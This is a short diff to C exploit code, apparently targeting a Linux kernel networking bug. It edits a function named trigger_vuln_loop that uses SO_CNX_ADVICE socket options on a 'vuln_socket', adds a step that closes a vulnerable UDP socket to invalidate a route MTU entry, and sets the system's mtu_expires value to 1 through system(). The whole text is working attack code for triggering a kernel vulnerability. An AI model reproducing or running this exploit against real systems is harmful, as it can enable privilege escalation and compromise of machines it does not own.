@@ -629,9 +629,12 @@ void trigger_vuln_loop() {
 
 #ifdef DEBUG
     LOG("start trigger");
+    sleep(2);
+    // trigger invalidation of mtu entry
+    close(open_vuln_ipv4_udp_socket());
     int sixseven = 67;
-    int sixnine = 69;
-    SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
+    // int sixnine = 69;
+    // SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixnine, sizeof(sixnine)));
     SYSCHK(setsockopt(ctx.vuln_socket, SOL_SOCKET, SO_CNX_ADVICE, &sixseven, sizeof(sixseven)));
     LOG("debug triggered");
     sleep(1);
@@ -1028,6 +1031,7 @@ int main() {
 
     set_hard_file_limit(16384);
     set_soft_file_limit(16384);
+    system("echo 1 > /proc/sys/net/ipv4/route/mtu_expires");
 
     // open_vuln_ipv4_udp_socket();
     // for (;;) {}
